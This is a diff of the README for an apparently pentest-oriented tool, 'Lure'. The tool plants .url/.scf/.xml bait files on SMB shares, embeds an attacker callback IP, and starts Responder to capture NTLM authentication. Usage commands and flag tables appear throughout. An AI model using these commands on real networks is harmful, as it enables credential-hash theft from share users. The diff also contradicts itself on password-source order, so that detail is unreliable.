@@ -31,21 +31,24 @@ pip install git+https://github.com/Real-Fruit-Snacks/Lure.git
 ```
 
 ```bash
-# Drop a .url file on an open share and start Responder
-sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -u
+# Drop a .scf file on an open share and start Responder
+sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s public -p scf
 
-# Authenticated put across a domain share, prompting for the password
-sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 \
-    -a shares -d CORP -U jdoe --ask-pass -u
+# Authenticated upload to a domain share, prompting for the password
+sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 \
+    -s shares -u CORP/jdoe --ask-pass
 
-# Drop all three payload types at once with a custom basename
-sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -A --name @docs
+# Drop all three (default) into a nested subdirectory
+sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 \
+    -s shares -d HR/public
 
 # After the engagement: remove the payloads from the share
-sudo lure -r 10.10.10.5 -a public -A --cleanup
+sudo lure clean -t 10.10.10.5 -s public
 ```
 
 > `lure` requires `smbclient` and `responder` on `$PATH`. On Kali: `sudo apt install smbclient responder`.
+
+> **Upgrading from v1.x?** The flat `lure -r ... -l ... -A` interface is gone. Run `lure --help` for the four new subcommands. See [CHANGELOG.md](CHANGELOG.md) for the full rename table.
 
 ---
 
@@ -65,72 +68,110 @@ The `@` prefix sorts the files to the top of the directory listing, maximizing t
 
 ### Drop and Listen
 
-Lure handles the full workflow in one command: generates the payload, uses `smbclient` to upload it to the target share (anonymous, authenticated, or into a nested subdirectory), then hands off to Responder on your chosen interface to catch the inbound authentication.
+`lure drop` handles the full workflow in one command: generates the payloads, uses `smbclient` to upload them to the target share (anonymous, authenticated, or into a nested subdirectory), then hands off to Responder on your chosen interface to catch the inbound authentication. Pass `--no-listen` to drop only, or use `lure listen -i IFACE` to start Responder separately.
 
 ### Subdirectory Targeting
 
-When the share root is read-only but a subdirectory is writable, `-o <path>` uploads the payload directly into the nested location without requiring a separate mount.
+When the share root is read-only but a subdirectory is writable, `-d <path>` uploads the payload directly into the nested location without requiring a separate mount.
+
+### Flexible Authentication
+
+`-u/--user` accepts every form operators tend to type: `user`, `DOMAIN/user`, `DOMAIN\user`, or `user@DOMAIN.LOCAL`. The domain is parsed out automatically — no separate `--domain` flag.
+
+Passwords have three sources, in order of preference: `--ask-pass` (interactive prompt with no echo), `$LURE_PASSWORD` (environment variable), or `--pass <value>` (visible in `ps`).
+
+### Cleanup and Dry-Run
+
+`lure clean` removes payloads from a share after the engagement. Every subcommand also accepts `--dry-run`, which prints the exact `smbclient` invocation (shell-quoted, copy-pasteable) without writing or uploading anything — handy for sanity-checking commands or planning on a workstation that doesn't have `smbclient` installed.
 
 ### Water-Themed Terminal Output
 
-Catppuccin Mocha palette — Teal, Sky, Sapphire, Blue, Lavender — applied via 24-bit ANSI escapes. Status messages use green / yellow / red semantics for success / progress / error.
+Catppuccin Mocha palette — Teal, Sky, Sapphire, Blue, Lavender — applied via 24-bit ANSI escapes. Status messages use green / yellow / red semantics for success / progress / error. Honors `--no-color` and the `$NO_COLOR` env var.
 
 ---
 
 ## Command Reference
 
-### Target
+```
+lure <command> [options]
+
+Commands:
+  drop      Drop bait files onto a share and (optionally) start Responder
+  clean     Remove previously dropped bait from a share
+  listen    Start Responder only (no upload)
+  list      Enumerate shares on a target via 'smbclient -L'
+
+Global:
+  -V, --version    Print version and exit
+  --no-color       Disable color output (also honors $NO_COLOR)
+```
+
+### `lure drop`
 
 | Flag | Description |
 |------|-------------|
-| `-r`, `--RHOST <ip>` | Target SMB server |
-| `-l`, `--LHOST <ip>` | Attacker IP (embedded in payload UNC path) |
-| `-a`, `--Share <name>` | Target share name |
-| `-o`, `--Other <path>` | Nested subdirectory inside the share |
-| `-i`, `--Interface <iface>` | Responder listen interface |
+| `-t`, `--target <ip>` | Target SMB server *(required)* |
+| `-s`, `--share <name>` | Target share name *(required)* |
+| `-c`, `--callback <ip>` | Attacker IP embedded in payload UNC paths *(required)* |
+| `-i`, `--iface <iface>` | Network interface for Responder *(required unless `--no-listen` or `--dry-run`)* |
+| `-d`, `--dir <path>` | Subdirectory inside the share |
+| `-p`, `--payload <type>` | `url`, `scf`, `xml`, or `all` (repeatable; default: all three) |
+| `--name <base>` | Custom payload basename (default: `@lure`) |
+| `--no-listen` | Drop only — skip the Responder handoff |
+| `--dry-run` | Print the `smbclient` command without writing or uploading |
+| `-u`, `--user <user>` | Username — see [Authentication](#authentication) |
+| `--pass <pass>` | Password (visible in `ps`) |
+| `--ask-pass` | Prompt for the password interactively |
+
+### `lure clean`
+
+| Flag | Description |
+|------|-------------|
+| `-t`, `--target <ip>` | Target SMB server *(required)* |
+| `-s`, `--share <name>` | Target share name *(required)* |
+| `-d`, `--dir <path>` | Subdirectory inside the share |
+| `-p`, `--payload <type>` | Which payloads to remove (repeatable; default: all three) |
+| `--name <base>` | Match payloads with this basename (default: `@lure`) |
+| `--dry-run` | Print the `smbclient` command without deleting |
+| `-u`, `--user <user>` | Username — see [Authentication](#authentication) |
+| `--pass <pass>` | Password |
+| `--ask-pass` | Prompt for the password |
+
+### `lure listen`
+
+| Flag | Description |
+|------|-------------|
+| `-i`, `--iface <iface>` | Network interface for Responder *(required)* |
+
+### `lure list`
+
+| Flag | Description |
+|------|-------------|
+| `-t`, `--target <ip>` | Target SMB server *(required)* |
+| `--dry-run` | Print the `smbclient -L` command without invoking it |
+| `-u`, `--user <user>` | Username — see [Authentication](#authentication) |
+| `--pass <pass>` | Password |
+| `--ask-pass` | Prompt for the password |
 
 ### Authentication
 
-| Flag | Description |
-|------|-------------|
-| `-d`, `--DOMAIN <name>` | Domain for authenticated upload |
-| `-U`, `--Username <user>` | Username for authenticated upload |
-| `-P`, `--Password <pass>` | Password (visible in `ps`; prefer the alternatives below) |
-| `--ask-pass` | Prompt for the password interactively (no echo) |
-| `$LURE_PASSWORD` | Environment variable consulted when `-P` is absent |
+`-u/--user` accepts any of these forms — the domain is parsed automatically:
 
-### Payload Selection
+| Form | Parsed as |
+|------|-----------|
+| `jdoe` | user only, no domain |
+| `CORP/jdoe` | domain `CORP`, user `jdoe` |
+| `CORP\jdoe` | domain `CORP`, user `jdoe` |
+| `jdoe@corp.local` | domain `corp.local`, user `jdoe` |
 
-| Flag | Description |
-|------|-------------|
-| `-u`, `--url` | Drop the `.url` payload |
-| `-s`, `--scf` | Drop the `.scf` payload |
-| `-x`, `--xml` | Drop the `.xml` payload |
-| `-A`, `--All` | Drop all three in a single `smbclient` session |
-| `--name <base>` | Custom payload basename (default: `@lure`) |
-
-### Modes
-
-| Flag | Description |
-|------|-------------|
-| `--no-responder` | Drop the payload only — skip the Responder handoff |
-| `--cleanup` | Delete previously dropped payloads from the share (implies `--no-responder`) |
-| `-V`, `--version` | Print version and exit |
-
-### Upload Modes
-
-| Condition | Behavior |
-|-----------|----------|
-| `-U` and password set | Authenticated upload using `DOMAIN/USER` + `--password` |
-| `-o <path>` set | `cd` into nested path before `put`/`del` |
-| Neither | Anonymous upload to share root |
+Password resolution order: `--pass <value>` > `$LURE_PASSWORD` env var > `--ask-pass` prompt.
 
 ### Exit Codes
 
 | Code | Meaning |
 |------|---------|
 | `0` | Success |
-| `2` | Invalid argument combination (e.g. username without password) |
+| `2` | Invalid argument combination (e.g. username without password, missing required flag) |
 | `4` | Prerequisite missing (`smbclient` or `responder` not on `$PATH`) |
 | other | Propagated from `smbclient` |
 
